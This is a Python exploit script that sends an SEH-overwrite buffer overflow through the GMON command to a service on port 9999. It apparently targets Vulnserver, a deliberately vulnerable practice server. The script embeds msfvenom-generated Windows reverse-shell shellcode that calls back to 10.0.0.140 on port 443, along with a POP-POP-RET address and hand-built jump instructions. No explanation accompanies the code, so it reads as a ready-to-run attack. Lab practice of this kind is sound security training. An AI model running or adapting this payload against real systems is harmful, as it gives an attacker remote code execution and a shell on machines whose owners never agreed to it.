import socket
import socket
import struct

HOST = '10.0.0.160'
PORT = 9999

# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.140 LPORT=443 EXITFUNC=seh -f python -v SHELL -b '\x00'

SHELL =  b""
SHELL += b"\xdd\xc2\xd9\x74\x24\xf4\x58\xbb\x0c\x09\x64\x7b"
SHELL += b"\x29\xc9\xb1\x52\x83\xc0\x04\x31\x58\x13\x03\x54"
SHELL += b"\x1a\x86\x8e\x98\xf4\xc4\x71\x60\x05\xa9\xf8\x85"
SHELL += b"\x34\xe9\x9f\xce\x67\xd9\xd4\x82\x8b\x92\xb9\x36"
SHELL += b"\x1f\xd6\x15\x39\xa8\x5d\x40\x74\x29\xcd\xb0\x17"
SHELL += b"\xa9\x0c\xe5\xf7\x90\xde\xf8\xf6\xd5\x03\xf0\xaa"
SHELL += b"\x8e\x48\xa7\x5a\xba\x05\x74\xd1\xf0\x88\xfc\x06"
SHELL += b"\x40\xaa\x2d\x99\xda\xf5\xed\x18\x0e\x8e\xa7\x02"
SHELL += b"\x53\xab\x7e\xb9\xa7\x47\x81\x6b\xf6\xa8\x2e\x52"
SHELL += b"\x36\x5b\x2e\x93\xf1\x84\x45\xed\x01\x38\x5e\x2a"
SHELL += b"\x7b\xe6\xeb\xa8\xdb\x6d\x4b\x14\xdd\xa2\x0a\xdf"
SHELL += b"\xd1\x0f\x58\x87\xf5\x8e\x8d\xbc\x02\x1a\x30\x12"
SHELL += b"\x83\x58\x17\xb6\xcf\x3b\x36\xef\xb5\xea\x47\xef"
SHELL += b"\x15\x52\xe2\x64\xbb\x87\x9f\x27\xd4\x64\x92\xd7"
SHELL += b"\x24\xe3\xa5\xa4\x16\xac\x1d\x22\x1b\x25\xb8\xb5"
SHELL += b"\x5c\x1c\x7c\x29\xa3\x9f\x7d\x60\x60\xcb\x2d\x1a"
SHELL += b"\x41\x74\xa6\xda\x6e\xa1\x69\x8a\xc0\x1a\xca\x7a"
SHELL += b"\xa1\xca\xa2\x90\x2e\x34\xd2\x9b\xe4\x5d\x79\x66"
SHELL += b"\x6f\x68\x7e\x68\xe3\x04\x7c\x68\xfa\x6f\x09\x8e"
SHELL += b"\x96\x9f\x5c\x19\x0f\x39\xc5\xd1\xae\xc6\xd3\x9c"
SHELL += b"\xf1\x4d\xd0\x61\xbf\xa5\x9d\x71\x28\x46\xe8\x2b"
SHELL += b"\xff\x59\xc6\x43\x63\xcb\x8d\x93\xea\xf0\x19\xc4"
SHELL += b"\xbb\xc7\x53\x80\x51\x71\xca\xb6\xab\xe7\x35\x72"
SHELL += b"\x70\xd4\xb8\x7b\xf5\x60\x9f\x6b\xc3\x69\x9b\xdf"
SHELL += b"\x9b\x3f\x75\x89\x5d\x96\x37\x63\x34\x45\x9e\xe3"
SHELL += b"\xc1\xa5\x21\x75\xce\xe3\xd7\x99\x7f\x5a\xae\xa6"
SHELL += b"\xb0\x0a\x26\xdf\xac\xaa\xc9\x0a\x75\xd4\x38\x86"
SHELL += b"\x60\x41\xe3\x73\xc9\x0f\x14\xae\x0e\x36\x97\x5a"
SHELL += b"\xef\xcd\x87\x2f\xea\x8a\x0f\xdc\x86\x83\xe5\xe2"
SHELL += b"\x35\xa3\x2f"

PAYLOAD = (
    b'GMON /.:/' +
    SHELL +
    b'A' * (3551 - 4 - len(SHELL)) +
    # JMP SHORT +0xa
    b'\xeb\x08' +
    # NOP NOP to fill the 4 bytes of nSEH
    b'\x90\x90' +
    # 625011FB    58                          POP EAX
    # 625011FC    5A                          POP EDX
    # 625011FD    C3                          RETN
    struct.pack('<L', 0x625011FB) +
    b'C' * 2 +
    # JMP long backwards to the start of our 'A' buffer
    b'\xe9\x16\xf2\xff\xff' +
    b'C' * (1445 - 2 - 5)
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
